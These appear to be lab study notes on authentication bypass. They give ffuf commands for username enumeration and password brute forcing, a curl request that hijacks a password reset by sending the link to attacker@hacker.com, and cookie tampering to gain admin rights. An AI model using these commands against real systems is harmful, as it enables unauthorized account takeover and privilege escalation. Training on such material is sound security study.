
# Authentication Bypass

## Username Enumeration via FFUF

**Goal:** Identify valid usernames on a system via feedback-based brute forcing.

**Tool:** ffuf

**Command:**
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

### Explanation:
- `-w`: Wordlist file path
- `-X`: HTTP method (POST)
- `-d`: POST data (FUZZ used as placeholder for wordlist insertion)
- `-H`: Header (Content-Type)
- `-u`: Target URL
- `-mr`: Match response string indicating valid username

## Brute Forcing Login

**Goal:** Use valid usernames and a password list to brute force access.

**Tool:** ffuf

**Command:**
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

### Explanation:
- `W1`: Username wordlist variable
- `W2`: Password wordlist variable
- `-fc 200`: Filter out responses with status 200 (indicating login failure)

## Logic Flaws in Authentication

**Example Code:**
```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
### Flaw:
Case-sensitive string matching can allow path-based privilege escalation (`/adMin` bypasses check).

## Password Reset Logic Flaw

**Target:** `http://MACHINE_IP/customers/reset`

### Exploitation Steps:

1. Stage 1: Submit email (GET)
2. Stage 2: Submit username (POST)

**Curl Request 1:**
```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

**Curl Request 2 (Malicious):**
```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

**Vulnerability:** The `$_REQUEST` array uses POST over GET if keys overlap, redirecting reset link to attacker-controlled email.

## Cookie-Based Authentication

### Plain Text Cookies

**Examples:**
```http
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

**Exploit Requests:**
```bash
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
```

## Hashes in Cookies

**Hash Examples:**
- MD5: `c4ca4238a0b923820dcc509a6f75849b`
- SHA-256: `6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b`

### Tools:
Use [crackstation.net](https://crackstation.net/) for reverse lookup.

## Encoding in Cookies

**Example:**
```http
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
```

**Decoded:**
```json
{"id":1,"admin":false}
```

**Exploit:**
Change to `{"id":1,"admin":true}`, encode in base64, and reuse as session cookie.
